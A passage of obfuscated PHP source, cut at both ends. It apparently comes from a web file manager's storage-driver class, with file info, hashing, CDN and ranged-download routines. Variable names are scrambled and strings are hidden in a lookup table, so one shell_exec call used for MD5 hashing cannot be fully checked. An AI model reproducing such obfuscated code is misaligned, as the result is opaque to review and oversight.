$Ğ¨˜ª¶ê = $this->exist($Ö÷Æ© ÷); return $Ğ¨˜ª¶ê ? $Ö÷Æ© ÷ : !1; } public function setModifyTime($á²ÃÂ›, $à°£™‘˜ = '') { } public function renameObject($³ªÈßØÍ, $ˆôê¢ÏË) { $ªÌ„¤äË = $ˆôê¢ÏË; $³ªÈßØÍ = $this->getPathOuter($³ªÈßØÍ); $ˆôê¢ÏË = $this->pathFather($³ªÈßØÍ) . $ˆôê¢ÏË; $Ò„“•Ûé = IO::copy($³ªÈßØÍ, $this->pathFather($³ªÈßØÍ), REPEAT_RENAME_FOLDER, $ªÌ„¤äË); if ($Ò„“•Ûé) { IO::remove($³ªÈßØÍ); } return $Ò„“•Ûé ? $ˆôê¢ÏË : !1; } public function tempFile($âÕ½·Àé = '', $ÄØßù©˜ = '') { if (!$âÕ½·Àé) { $âÕ½·Àé = rand_string(15); } $•öú«é = TEMP_FILES . rand_string(15) . $_SERVER[÷ôÚîå][8]; @mkdir($•öú«é, DEFAULT_PERRMISSIONS, !0); $ŞÇ˜–‡¢ = $•öú«é . $âÕ½·Àé; @touch($ŞÇ˜–‡¢); if ($ÄØßù©˜) { file_put_contents($ŞÇ˜–‡¢, $ÄØßù©˜); } return $ŞÇ˜–‡¢; } public function tempFileRemve($òç°Á§‚) { @unlink($òç°Á§‚); @rmdir($this->pathFather($òç°Á§‚)); } public function mkfile($ªÄ©ƒš„, $Ì–şÚùË = '', $©Ë©Ùùõ = REPEAT_RENAME) { } public function mkdir($šŒ‘¦Ğ, $»Ìô­Ô© = REPEAT_SKIP) { } public function delFile($¬ş‚¨£) { } public function delFolder($É´Ù¹ÌÖ) { } public function copyFile($çã¿´åã, $°Ô¼Å§¼) { } public function moveFile($¼²é÷Äº, $£×€›ìª) { } public function remove($ÙÍÌ’İ¥) { if ($this->isFile($ÙÍÌ’İ¥)) { return $this->delFile($ÙÍÌ’İ¥); } return $this->delFolder($ÙÍÌ’İ¥); } public function rename($±¡¥Ñûè, $¡ë„ôóˆ) { } public function exist($Ó±Ê ) { } public function findByHash($ªöáü÷– = '', $Òş­ÜÑ = '') { return !1; } public function isFile($Ş«ö“Ñã) { } public function isFolder($å‘‚çİ) { } public function size($ã‚Š¸æ) { } public function info($«Œ©ğı”) { } public function infoSimple($çùÙƒ·†) { return $this->info($çùÙƒ·†); } public function infoAuth($ò²­ôÉİ) { return $this->info($ò²­ôÉİ); } public function infoFull($³á–ÙÌ) { return $this->info($³á–ÙÌ); } public function infoFullSimple($ë¶ÒúºÈ) { return $this->info($ë¶ÒúºÈ); } public function infoWithChildren($Ãùàä÷) { $Ì€ûºè‡ =& $_SERVER[÷ôÚîå]; static $¾• ûå´ = array(); if (isset($¾• ûå´[$Ãùàä÷])) { return $¾• ûå´[$Ãùàä÷]; } $‹•ìÕ« = $this->info($Ãùàä÷); if ($‹•ìÕ« && $‹•ìÕ«[$Ì€ûºè‡[33]] == $Ì€ûºè‡[88]) { $çÜØõÇ¶ = array($Ì€ûºè‡[89] => 0, $Ì€ûºè‡[90] => 0, $Ì€ûºè‡[91] => 0); $this->infoChildren($Ãùàä÷, $çÜØõÇ¶); $‹•ìÕ«[$Ì€ûºè‡[89]] = $çÜØõÇ¶[$Ì€ûºè‡[89]]; $‹•ìÕ«[$Ì€ûºè‡[92]] = array($Ì€ûºè‡[93] => $çÜØõÇ¶[$Ì€ûºè‡[90]], $Ì€ûºè‡[94] => $çÜØõÇ¶[$Ì€ûºè‡[91]]); $¾• ûå´[$Ãùàä÷] = $‹•ìÕ«; } return $‹•ìÕ«; } public function listPath($óìçåù­, $©ŠÁ¨ß = false) { } public function has($·ü†¥‰°, $ëãœçÏÒ = false, $ëÒ³ã‚ = false) { } public function canRead($ßö’‘Ï½) { } public function canWrite($¾úèê‹Ÿ) { } public function getContent($¬§¨”Ü) { } public function setContent($¹òæ°ô, $‰ğ¡‚şı = '') { } protected function infoChildren($Ãô¡˜¨´, &$â‹“ƒ¥) { $ğà¶Ëä =& $_SERVER[÷ôÚîå]; check_abort_echo(); $­¡‡ÕÃÓ = $this->listPath($Ãô¡˜¨´, !0); $­¡‡ÕÃÓ = array_merge($­¡‡ÕÃÓ[$ğà¶Ëä[95]], $­¡‡ÕÃÓ[$ğà¶Ëä[96]]); foreach ($­¡‡ÕÃÓ as $ì˜Ò…’¯) { if ($ì˜Ò…’¯[$ğà¶Ëä[33]] == $ğà¶Ëä[88]) { $â‹“ƒ¥[$ğà¶Ëä[91]]++; $êÉ â… = $this->getPathInner($ì˜Ò…’¯[$ğà¶Ëä[97]]); $this->infoChildren($êÉ â…, $â‹“ƒ¥); } else { $â‹“ƒ¥[$ğà¶Ëä[90]]++; $â‹“ƒ¥[$ğà¶Ëä[89]] += $ì˜Ò…’¯[$ğà¶Ëä[89]]; } } } public function fileSubstr($ä¸¬Ö÷, $“¿Å«¬», $×±Û ›) { } public function listAll($ê¬ç¯¶‡) { } public function listAllMake($öå›À‰á, &$Æäñ¢ŒÂ) { $Ë³ò°‹ó =& $_SERVER[÷ôÚîå]; check_abort_echo(); $ù«Á¿é‘ = $this->listPath($öå›À‰á, !0); if (!$ù«Á¿é‘) { return; } $–éŸÉØù = array_merge($ù«Á¿é‘[$Ë³ò°‹ó[95]], $ù«Á¿é‘[$Ë³ò°‹ó[96]]); foreach ($–éŸÉØù as $—»ÀİÒ) { $…Ö€“¸ş = $—»ÀİÒ[$Ë³ò°‹ó[33]] == $Ë³ò°‹ó[88]; $×’èÊ›¸ = array($Ë³ò°‹ó[97] => $—»ÀİÒ[$Ë³ò°‹ó[97]], $Ë³ò°‹ó[88] => $…Ö€“¸ş); if (isset($—»ÀİÒ[$Ë³ò°‹ó[89]])) { $×’èÊ›¸[$Ë³ò°‹ó[89]] = $—»ÀİÒ[$Ë³ò°‹ó[89]]; } if (isset($—»ÀİÒ[$Ë³ò°‹ó[98]])) { $×’èÊ›¸[$Ë³ò°‹ó[98]] = $—»ÀİÒ[$Ë³ò°‹ó[98]]; } if (!$…Ö€“¸ş) { $Æäñ¢ŒÂ[] = $×’èÊ›¸; continue; } $Æäñ¢ŒÂ[] = $×’èÊ›¸; $³å×–¹ = $—»ÀİÒ[$Ë³ò°‹ó[97]]; $Éûƒ¦í£ = $this->pathDriver; if (substr($—»ÀİÒ[$Ë³ò°‹ó[97]], 0, strlen($Éûƒ¦í£)) == $Éûƒ¦í£) { $³å×–¹ = substr($³å×–¹, strlen($Éûƒ¦í£)); } $this->listAllMake($³å×–¹, $Æäñ¢ŒÂ); } } public function listAllSimple($ŞÈâÉ ¥, $ßÇ¯¬Ù = false) { $ÙƒòŸÌ¥ = $this->listAll($ŞÈâÉ ¥); return $this->listAllSimpleMake($ÙƒòŸÌ¥, $this->getPathOuter($ŞÈâÉ ¥), $ßÇ¯¬Ù); } public function listAllSimpleMake($ÈüÀù, $ßâÇŠ¶Ê, $Œ³ÓÃ—Ó) { $ğ­öİ»ı =& $_SERVER[÷ôÚîå]; $¼²âÖè = array(); $ßâÇŠ¶Ê = rtrim(get_path_father($ßâÇŠ¶Ê), $ğ­öİ»ı[8]) . $ğ­öİ»ı[8]; foreach ($ÈüÀù as $í¨§„ì§) { $¾“‚ÏñÓ = array($ğ­öİ»ı[97] => $í¨§„ì§[$ğ­öİ»ı[97]], $ğ­öİ»ı[99] => $í¨§„ì§[$ğ­öİ»ı[97]], $ğ­öİ»ı[88] => $í¨§„ì§[$ğ­öİ»ı[88]]); if (isset($í¨§„ì§[$ğ­öİ»ı[89]]) && !$í¨§„ì§[$ğ­öİ»ı[88]]) { $¾“‚ÏñÓ[$ğ­öİ»ı[89]] = $í¨§„ì§[$ğ­öİ»ı[89]]; } if (isset($í¨§„ì§[$ğ­öİ»ı[98]])) { $¾“‚ÏñÓ[$ğ­öİ»ı[98]] = $í¨§„ì§[$ğ­öİ»ı[98]]; } if (is_array($í¨§„ì§[$ğ­öİ»ı[100]])) { $¾“‚ÏñÓ[$ğ­öİ»ı[99]] = $í¨§„ì§[$ğ­öİ»ı[100]][$ğ­öİ»ı[97]]; $¾“‚ÏñÓ[$ğ­öİ»ı[89]] = $í¨§„ì§[$ğ­öİ»ı[100]][$ğ­öİ»ı[89]]; $¾“‚ÏñÓ[$ğ­öİ»ı[98]] = $í¨§„ì§[$ğ­öİ»ı[100]][$ğ­öİ»ı[98]]; } else { if (substr($í¨§„ì§[$ğ­öİ»ı[97]], 0, strlen($ßâÇŠ¶Ê)) == $ßâÇŠ¶Ê) { $¾“‚ÏñÓ[$ğ­öİ»ı[97]] = substr($í¨§„ì§[$ğ­öİ»ı[97]], strlen($ßâÇŠ¶Ê)); } } $§Œ”¼™å = $í¨§„ì§[$ğ­öİ»ı[88]] ? $ğ­öİ»ı[8] : $ğ­öİ»ı[12]; $¾“‚ÏñÓ[$ğ­öİ»ı[99]] = rtrim($¾“‚ÏñÓ[$ğ­öİ»ı[99]], $ğ­öİ»ı[8]) . $§Œ”¼™å; $¾“‚ÏñÓ[$ğ­öİ»ı[97]] = $ğ­öİ»ı[8] . trim($¾“‚ÏñÓ[$ğ­öİ»ı[97]], $ğ­öİ»ı[8]) . $§Œ”¼™å; if (!$Œ³ÓÃ—Ó) { $½Åìò¥© = explode($ğ­öİ»ı[8], trim($¾“‚ÏñÓ[$ğ­öİ»ı[97]], $ğ­öİ»ı[8])); $¾“‚ÏñÓ[$ğ­öİ»ı[97]] = $ğ­öİ»ı[8] . implode($ğ­öİ»ı[8], array_slice($½Åìò¥©, 1)) . $§Œ”¼™å; } $¼²âÖè[] = $¾“‚ÏñÓ; } return array_sort_by($¼²âÖè, $ğ­öİ»ı[97]); } public function upload($Ü÷³éŒ, $ñõËàÔ•, $æ˜İ©ùù = false, $…Ìİèâ = REPEAT_REPLACE) { } public function uploadFileByID($òÇ–òíø, $ìµ ¸íÖ, $÷…±Ä) { } public function uploadFileByPath($ÙœŞ´ë×, $±ƒ…Õ‚¢, $í çÓßÃ = array()) { } public function isUploadServer() { $ô×Ùã¼µ =& $_SERVER[÷ôÚîå]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ô×Ùã¼µ[101]) { return !0; } return $GLOBALS[$ô×Ùã¼µ[6]][$ô×Ùã¼µ[102]][$ô×Ùã¼µ[103]]; } public function isFileOutServer() { $óË‹Ãšá =& $_SERVER[÷ôÚîå]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $óË‹Ãšá[101]) { return !0; } return $GLOBALS[$óË‹Ãšá[6]][$óË‹Ãšá[102]][$óË‹Ãšá[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ê”ùíÛ) { $ûŞğÍ» =& $_SERVER[÷ôÚîå]; if (!$this->isCdnHost()) { return $ê”ùíÛ; } return str_replace(trim(get_url_root($ê”ùíÛ), $ûŞğÍ»[8]), trim($this->cdnHost, $ûŞğÍ»[8]), $ê”ùíÛ); } public function uploadLink($™½ºóèš, $‰ñª·Ôã = 0) { $íÓú‘ñò =& $_SERVER[÷ôÚîå]; if ($this->isUploadServer()) { return; } $ÄÃ  •¦ = $this->getType(); if (!in_array($ÄÃ  •¦, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $š®°–Ê’ = 1024 * 1024 * 10; $¸œ—€§Ò = $‰ñª·Ôã <= $š®°–Ê’ ? $íÓú‘ñò[105] : $íÓú‘ñò[106]; $âËßã‰ = (!$‰ñª·Ôã ? 1 : ceil($‰ñª·Ôã / pow(1024, 3))) * 3600 * 4; $ù¤±á²Ö = $this->{$¸œ—€§Ò}($™½ºóèš, $âËßã‰); if ($ù¤±á²Ö) { $ù¤±á²Ö[$íÓú‘ñò[107]] = $™½ºóèš; $ù¤±á²Ö[$íÓú‘ñò[108]] = $ÄÃ  •¦; } return $ù¤±á²Ö; } public function uploadFormData($²ÄÕ¡şÙ, $™Ö»áğ = 3600) { } public function multiUploadFormData($íüå˜ôÌ, $“¤Íéİ– = 3600) { } public function download($îé‹‹İÔ, $Ô°¹ã‚¢) { } public function ext($µÈ’çÀÑ) { $ä®•ß¹¿ =& $_SERVER[÷ôÚîå]; if (strpos($µÈ’çÀÑ, $ä®•ß¹¿[8]) === -1) { $¨ıÄ‰£§ = $µÈ’çÀÑ; } else { $¨ıÄ‰£§ = $this->pathThis($µÈ’çÀÑ); } $ê…± í¦ = $ä®•ß¹¿[12]; if (strstr($¨ıÄ‰£§, $ä®•ß¹¿[10])) { $ê…± í¦ = substr($¨ıÄ‰£§, strrpos($¨ıÄ‰£§, $ä®•ß¹¿[10]) + 1); $ê…± í¦ = strtolower($ê…± í¦); } if (strlen($ê…± í¦) > 3 && preg_match($ä®•ß¹¿[109], $ê…± í¦, $†Ğİ‡É®)) { $ê…± í¦ = $ä®•ß¹¿[12]; } return $ê…± í¦; } public function pathThis($°ß™ùû¿) { $ÀèÌ¡Üù =& $_SERVER[÷ôÚîå]; $°ß™ùû¿ = str_replace($ÀèÌ¡Üù[110], $ÀèÌ¡Üù[8], rtrim($°ß™ùû¿, $ÀèÌ¡Üù[8])); $€®¯ÍÓ¤ = strrpos($°ß™ùû¿, $ÀèÌ¡Üù[8]); if ($€®¯ÍÓ¤ === !1) { return $°ß™ùû¿; } return substr($°ß™ùû¿, $€®¯ÍÓ¤ + 1); } public function pathFather($×»À÷±•) { $ƒÉô“¤´ =& $_SERVER[÷ôÚîå]; $×»À÷±• = str_replace($ƒÉô“¤´[110], $ƒÉô“¤´[8], rtrim($×»À÷±•, $ƒÉô“¤´[8])); $›äÇ ã— = strrpos($×»À÷±•, $ƒÉô“¤´[8]); if ($›äÇ ã— === !1) { return $ƒÉô“¤´[12]; } return substr($×»À÷±•, 0, $›äÇ ã— + 1); } public function hashSimple($áˆĞÅ¼¤) { $¼š¾Œ˜› =& $_SERVER[÷ôÚîå]; if (!$áˆĞÅ¼¤) { return md5($¼š¾Œ˜›[12]); } $ŠĞÃêù¼ = $this->size($áˆĞÅ¼¤); $ãœÀ‰¬“ = 200; $Ç´° –§ = 50; if ($ŠĞÃêù¼ <= $ãœÀ‰¬“ * $Ç´° –§) { return $this->hashMd5($áˆĞÅ¼¤) . $ŠĞÃêù¼; } $¹Ü¤ÉÁ® = intval($ŠĞÃêù¼ / $Ç´° –§); $™†Ëœ ç = $¼š¾Œ˜›[12]; for ($÷Á°¥ÓŒ = 0; $÷Á°¥ÓŒ < $Ç´° –§; $÷Á°¥ÓŒ++) { $™†Ëœ ç .= $this->fileSubstr($áˆĞÅ¼¤, $¹Ü¤ÉÁ® * $÷Á°¥ÓŒ, $ãœÀ‰¬“); } $™†Ëœ ç .= $this->fileSubstr($áˆĞÅ¼¤, $ŠĞÃêù¼ - $ãœÀ‰¬“, $ãœÀ‰¬“); return md5($™†Ëœ ç) . $ŠĞÃêù¼; } public static $md5Cache = array(); public function hashMd5($Ä¼ÄÎúˆ) { if (!$Ä¼ÄÎúˆ) { return md5($_SERVER[÷ôÚîå][12]); } $Ä¼ÄÎúˆ = $this->iconvSystem($Ä¼ÄÎúˆ); if (isset(self::$md5Cache[$Ä¼ÄÎúˆ])) { return self::$md5Cache[$Ä¼ÄÎúˆ]; } self::$md5Cache[$Ä¼ÄÎúˆ] = $this->hashMd5Shell($Ä¼ÄÎúˆ); if (!self::$md5Cache[$Ä¼ÄÎúˆ]) { self::$md5Cache[$Ä¼ÄÎúˆ] = @md5_file($Ä¼ÄÎúˆ); } return self::$md5Cache[$Ä¼ÄÎúˆ]; } private function hashMd5Shell($ö·£›·) { $›úîÓòÁ =& $_SERVER[÷ôÚîå]; if (!$ö·£›·) { return md5($›úîÓòÁ[12]); } if (!function_exists($›úîÓòÁ[111])) { return !1; } $«¹ Ï× = array($›úîÓòÁ[112], $›úîÓòÁ[113]); $¡õ×÷™Ò = Cache::get($›úîÓòÁ[114]); if (!$¡õ×÷™Ò) { $Ù‹³¿Í… = BASIC_PATH . $›úîÓòÁ[115]; $åú¾×‡„ = md5_file($Ù‹³¿Í…); $¡õ×÷™Ò = $›úîÓòÁ[116]; foreach ($«¹ Ï× as $ÔË›­Ãé) { $×Æ¯ıÉŞ = shell_exec($ÔË›­Ãé . "\x20\x22{$Ù‹³¿Í…}\x22"); if ($×Æ¯ıÉŞ && substr(trim($×Æ¯ıÉŞ), 0, 32) == $åú¾×‡„) { $¡õ×÷™Ò = $ÔË›­Ãé; break; } } Cache::set($›úîÓòÁ[114], $¡õ×÷™Ò, 3600); } if ($¡õ×÷™Ò == $›úîÓòÁ[116]) { return !1; } $×Æ¯ıÉŞ = shell_exec($¡õ×÷™Ò . "\x20\x22{$ö·£›·}\42"); $×Æ¯ıÉŞ = str_replace($›úîÓòÁ[117], $›úîÓòÁ[12], $×Æ¯ıÉŞ); return substr($×Æ¯ıÉŞ, 0, 32); } public function link($øå¨±) { return $øå¨±; } public function fileOut($ßè†š¤, $ŸÀé÷Ü = false, $ÌÓ¶úëÌ = false, $£Á™Üª× = '') { $ÜÓë­Ï =& $_SERVER[÷ôÚîå]; $this->cacheMethod(null, null); if (!$ßè†š¤ || !$this->exist($ßè†š¤)) { show_json(LNG($ÜÓë­Ï[118]), !1, $ÌÓ¶úëÌ); } $É˜ıÑ©Ÿ = $this->getType() == $ÜÓë­Ï[119]; $Æ–ê©˜Ú = $GLOBALS[$ÜÓë­Ï[6]][$ÜÓë­Ï[102]][$ÜÓë­Ï[120]][$ÜÓë­Ï[121]]; $‹¶Á™ = (double) $GLOBALS[$ÜÓë­Ï[6]][$ÜÓë­Ï[102]][$ÜÓë­Ï[120]][$ÜÓë­Ï[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ĞıóéÍÙ = $this->infoFull($ßè†š¤); $Ùœ³Ÿˆè = $ĞıóéÍÙ[$ÜÓë­Ï[89]]; $¡şä— = gmdate($ÜÓë­Ï[123], $ĞıóéÍÙ[$ÜÓë­Ï[98]]); $˜ó™Àòá = $ÌÓ¶úëÌ ? $ÌÓ¶úëÌ : $this->iconvApp($ĞıóéÍÙ[$ÜÓë­Ï[32]]); $Ú¶½½Ñ = 0; $§ı¨šÄß = $Ùœ³Ÿˆè - 1; $Ş¤Íê = $this->ext($˜ó™Àòá); if (in_array($Ş¤Íê, array($ÜÓë­Ï[124], $ÜÓë­Ï[125], $ÜÓë­Ï[126], $ÜÓë­Ï[127]))) { $Ş¤Íê = $ÜÓë­Ï[128]; } if (in_array($Ş¤Íê, array($ÜÓë­Ï[129]))) { $Ş¤Íê = $ÜÓë­Ï[130]; } if (!$£Á™Üª×) { $£Á™Üª× = md5($¡şä— . $Ùœ³Ÿˆè); } $£Á™Üª× = $ÜÓë­Ï[131] . $£Á™Üª× . $ÜÓë­Ï[131]; $¼ÙÜ‚š¨ = get_file_mime($Ş¤Íê); $ˆĞ¿Ó¦ˆ = !0; $ˆĞ¿Ó¦ˆ = isset($_GET[$ÜÓë­Ï[132]]) ? !1 : !0; if ($ŸÀé÷Ü === !1 && !mime_support($¼ÙÜ‚š¨)) { $¼ÙÜ‚š¨ = $ÜÓë­Ï[133]; } header($ÜÓë­Ï[134]); header($ÜÓë­Ï[135] . $¼ÙÜ‚š¨); $ÇêƒıÍ¦ = rawurlencode($˜ó™Àòá); $ÇêƒıÍ¦ = $ÜÓë­Ï[131] . $ÇêƒıÍ¦ . $ÜÓë­Ï[136] . $ÇêƒıÍ¦; if ($ŸÀé÷Ü) { header($ÜÓë­Ï[137]); header($ÜÓë­Ï[138] . $ÇêƒıÍ¦); } else { if ($ˆĞ¿Ó¦ˆ) { header($ÜÓë­Ï[139] . $ÇêƒıÍ¦); } } $ÓªøÁÅ¬ = 3600 * 24 * 30; header($ÜÓë­Ï[140]); header($ÜÓë­Ï[141]); header($ÜÓë­Ï[142] . $ÓªøÁÅ¬); header($ÜÓë­Ï[143] . gmdate($ÜÓë­Ï[123], time() + $ÓªøÁÅ¬) . $ÜÓë­Ï[144]); if (isset($_SERVER[$ÜÓë­Ï[145]]) && strtotime($_SERVER[$ÜÓë­Ï[145]]) == $ĞıóéÍÙ[$ÜÓë­Ï[98]]) { header($ÜÓë­Ï[146], !0, 304); die; } if (isset($_SERVER[$ÜÓë­Ï[147]]) && $_SERVER[$ÜÓë­Ï[147]] == $£Á™Üª×) { header($ÜÓë­Ï[148] . $£Á™Üª×, !0, 304); die; } header($ÜÓë­Ï[148] . $£Á™Üª×); header($ÜÓë­Ï[149] . $¡şä— . $ÜÓë­Ï[144]); header($ÜÓë­Ï[150] . $˜ó™Àòá); header($ÜÓë­Ï[151]); header($ÜÓë­Ï[152] . $Ùœ³Ÿˆè); header($ÜÓë­Ï[153]); Hook::trigger($ÜÓë­Ï[154], $ßè†š¤, $Ùœ³Ÿˆè, $˜ó™Àòá, $Ş¤Íê); if (!$ŸÀé÷Ü && $Ş¤Íê == $ÜÓë­Ï[155]) { if ($Ùœ³Ÿˆè > 1024 * 1024 * 5) { die; } $”ĞŸÈ“ = $this->getContent($ßè†š¤); $”ĞŸÈ“ = Html::clearSVG($”ĞŸÈ“); header($ÜÓë­Ï[156] . strlen($”ĞŸÈ“)); echo $”ĞŸÈ“; die; } $¨ÓÄæûê = strtolower($_SERVER[$ÜÓë­Ï[157]]); if ($É˜ıÑ©Ÿ && $¨ÓÄæûê && $Æ–ê©˜Ú) { if (strstr($¨ÓÄæûê, $ÜÓë­Ï[158])) { header($ÜÓë­Ï[159] . $ßè†š¤); } else { if (strstr($¨ÓÄæûê, $ÜÓë­Ï[160])) { header($ÜÓë­Ï[161] . $ßè†š¤); } else { if (strstr($¨ÓÄæûê, $ÜÓë­Ï[162])) { header($ÜÓë­Ï[163] . $ßè†š¤); } } } if ($‹¶Á™) { header($ÜÓë­Ï[164] . $‹¶Á™); } return; } if (isset($_SERVER[$ÜÓë­Ï[165]])) { if (preg_match($ÜÓë­Ï[166], $_SERVER[$ÜÓë­Ï[165]], $Ğå‡×£)) { $Ú¶½½Ñ = intval($Ğå‡×£[1]); $Ú¶½½Ñ = $Ú¶½½Ñ <= 0 ? 0 : ($Ú¶½½Ñ >= $§ı¨šÄß ? $§ı¨šÄß : $Ú¶½½Ñ); if (!empty($Ğå‡×£[2])) { $­¤ôß = intval($Ğå‡×£[2]); $§ı¨šÄß = $­¤ôß < $Ú¶½½Ñ ? $Ú¶½½Ñ : ($­¤ôß >= $§ı¨šÄß ? $§ı¨šÄß : $­¤ôß); } } header($ÜÓë­Ï[167]); header("\x43\x6f\x6e\x74\145\156\164\x2d\122\x61\156\x67\145\x3a\x20\x62\171\164\x65\x73\x20{$Ú¶½½Ñ}\x2d{$§ı¨šÄß}\x2f" . $Ùœ³Ÿˆè); } else { header($ÜÓë­Ï[168]); } header($ÜÓë­Ï[169]); header($ÜÓë­Ï[170]); $¯ÖÑÆåÈ = !0; if ($_SERVER[$ÜÓë­Ï[171]] == $ÜÓë­Ï[172] && $Ùœ³Ÿˆè > 1204 * 1024 * 1024 * 2) { $¯ÖÑÆåÈ = !1; } if ($¯ÖÑÆåÈ) { header($ÜÓë­Ï[173] . ($§ı¨šÄß - $Ú¶½½Ñ + 1)); } if ($_SERVER[$ÜÓë­Ï[174]] == $ÜÓë­Ï[175]) { return; } $ö«§ÂŠµ = array($ÜÓë­Ï[176] => !1, $ÜÓë­Ï[177] => $Ú¶½½Ñ, $ÜÓë­Ï[178] => $§ı¨šÄß, $ÜÓë­Ï[179] => $Ş¤Íê, $ÜÓë­Ï[180] => $ĞıóéÍÙ, $ÜÓë­Ï[181] => $ÜÓë­Ï[12], $ÜÓë­Ï[182] => 0); $ö«§ÂŠµ = Hook::filter($ÜÓë­Ï[183], $ö«§ÂŠµ); $úÎØĞ„ = 1024 * 300; $ğÉ‘õï = 0; if ($‹¶Á™) { $ğÉ‘õï = intval(1000 * 1000 * ($úÎØĞ„ / $‹¶Á™)); } while ($Ú¶½½Ñ <= $§ı¨šÄß) { $îÆÒÇ²ö = timeFloat(); check_abort(); $èŠ”ì„Ù = $§ı¨šÄß - $Ú¶½½Ñ + 1; if ($èŠ”ì„Ù <= $úÎØĞ„) { $úÎØĞ„ = $èŠ”ì„Ù; } $”ĞŸÈ“ = $this->fileSubstr($ßè†š¤, $Ú¶½½Ñ, $úÎØĞ„); if ($ö«§ÂŠµ[$ÜÓë­Ï[176]]) { $ö«§ÂŠµ[$ÜÓë­Ï[181]] = $”ĞŸÈ“; $ö«§ÂŠµ[$ÜÓë­Ï[182]] = $Ú¶½½Ñ; $ö«§ÂŠµ = Hook::filter($ÜÓë­Ï[184], $ö«§ÂŠµ); $”ĞŸÈ“ = $ö«§ÂŠµ[$ÜÓë­Ï[181]]; } echo $”ĞŸÈ“; $Ú¶½½Ñ += $úÎØĞ„; if ($úÎØĞ„ == $èŠ”ì„Ù) { $Ú¶½½Ñ = $§ı¨šÄß + 1; } if ($ğÉ‘õï) { $ó×ú = intval(1000 * 1000 * (timeFloat() - $îÆÒÇ²ö)); $ç‚±éóø = $ğÉ‘õï - $ó×ú; if ($ç‚±éóø > 5) { usleep($ç‚±éóø); } } } } public function fileOutServer($Ãù™§»µ, $¼êú÷¬ä = false, $ØËú‹ÏŞ = false, $í¥œñÍé = '') { $this->fileOut($Ãù™§»µ, $¼êú÷¬ä, $ØËú‹ÏŞ, $í¥œñÍé); } public function fileOutLink($ÚÖ«­°‡) { header($_SERVER[÷ôÚîå][185] . $ÚÖ«­°‡); die; } public function cacheMethod($¨Ö’éû, $øÆÆÙÁ‹, $âÎÃ„ÉÙ = null) { $¸ò¬ÔË¨ =& $_SERVER[÷ôÚîå]; static $ÈûÄ°İ… = array(); $¯œì˜âå = $øÆÆÙÁ‹ ? ltrim($this->getPathOuter($øÆÆÙÁ‹), $¸ò¬ÔË¨[8]) : $¸ò¬ÔË¨[12]; $÷ÃõŠ‚Š = $¸ò¬ÔË¨[186] . $¨Ö’éû . $¸ò¬ÔË¨[187] . rtrim($¯œì˜âå, $¸ò¬ÔË¨[8]); if (is_null($¨Ö’éû)) { $ÈûÄ°İ… = array(); return; } if (is_null($øÆÆÙÁ‹)) { foreach ($ÈûÄ°İ… as $÷ÃõŠ‚Š => $ì®óØøÛ) { if (!strstr($÷ÃõŠ‚Š, $¸ò¬ÔË¨[186] . $¨Ö’éû . $¸ò¬ÔË¨[188])) { continue; } unset($ÈûÄ°İ…[$÷ÃõŠ‚Š]); } return; } if (!is_null($âÎÃ„ÉÙ)) { $ÈûÄ°İ…[$÷ÃõŠ‚Š] = $âÎÃ„ÉÙ; return; } $îï±Òº™ = isset($ÈûÄ°İ…[$÷ÃõŠ‚Š]) ? $ÈûÄ°İ…[$÷ÃõŠ‚Š] : null; if (!is_null($îï±Òº™)) { return $îï±Òº™; } $îï±Òº™ = $this->{$¨Ö’éû}($øÆÆÙÁ‹); $ÈûÄ°İ…[$÷ÃõŠ‚Š] = $îï±Òº™; return $îï±Òº™; } public function cacheMethodInfoSet($æ’ôÛïä, $ØÙ›´Ùò, $ı»‡Í£ = false) { $ø¨¢êñ¬ =& $_SERVER[÷ôÚîå]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ø¨¢êñ¬[189], $æ’ôÛïä, $ØÙ›´Ùò); $this->cacheMethod($ø¨¢êñ¬[190], $æ’ôÛïä, $ØÙ›´Ùò ? !1 : !0); if (is_array($ı»‡Í£)) { $this->cacheMethod($ø¨¢êñ¬[191], $æ’ôÛïä, $ı»‡Í£); } } public function fileOutImage($·ğ«Ü³´, $è˜‰‡ô» = 250) { $¦œÎÔ¼ =& $_SERVER[÷ôÚîå]; set_timeout(); if (substr($·ğ«Ü³´, 0, 4) == $¦œÎÔ¼[162]) { $this->fileOutLink($·ğ«Ü³´); } $âåî›Æ = $this->info($·ğ«Ü³´); $ÚáéÛ¾£ = !1; $¬À¡ºô„ = isset($GLOBALS[$¦œÎÔ¼[192]]) ? $GLOBALS[$¦œÎÔ¼[192]] : array(); if ($¬À¡ºô„ && $¬À¡ºô„[$¦œÎÔ¼[193]] == $âåî›Æ[$¦œÎÔ¼[97]]) { $âåî›Æ = $¬À¡ºô„; $Ó ¤£ñ³ = $âåî›Æ[$¦œÎÔ¼[194]]; if ($Ó ¤£ñ³ && isset($Ó ¤£ñ³[$¦œÎÔ¼[195]])) { if ($Ó ¤£ñ³[$¦œÎÔ¼[195]] <= $è˜‰‡ô» && $Ó ¤£ñ³[$¦œÎÔ¼[196]] <= $è˜‰‡ô») { $ÚáéÛ¾£ = !0; } } } if ($âåî›Æ[$¦œÎÔ¼[89]] <= 1024 * 50 || $ÚáéÛ¾£ || !function_exists($¦œÎÔ¼[197]) || $âåî›Æ[$¦œÎÔ¼[179]] == $¦œÎÔ¼[198]) { return $this->fileOut($·ğ«Ü³´, !1, $âåî›Æ[$¦œÎÔ¼[32]]); } $¡úÖ¯Æß = kodIO::hashPath($âåî›Æ); $¥ŸïßÕ = "\143\157\166\145\162\x5f{$¡úÖ¯Æß}\x5f{$è˜‰‡ô»}\56\x70\x6e\x67"; $ÉØÓ¦€„ = IO_PATH_SYSTEM_TEMP . $¦œÎÔ¼[199]; $ë¿ğÌÄƒ = IO::infoFullSimple($ÉØÓ¦€„); $¦Š–½ = $ë¿ğÌÄƒ && is_array($ë¿ğÌÄƒ) ? $ë¿ğÌÄƒ[$¦œÎÔ¼[97]] : $¦œÎÔ¼[12]; if (!$¦Š–½) { $¦Š–½ = IO::mkdir($ÉØÓ¦€„); } if ($âåî›Æ[$¦œÎÔ¼[200]] == $¦œÎÔ¼[201] && isset($âåî›Æ[$¦œÎÔ¼[202]]) && $âåî›Æ[$¦œÎÔ¼[202]] == kodIO::sourceID($¦Š–½)) { $µîõËŒí = $âåî›Æ[$¦œÎÔ¼[203]]; if ($è˜‰‡ô» 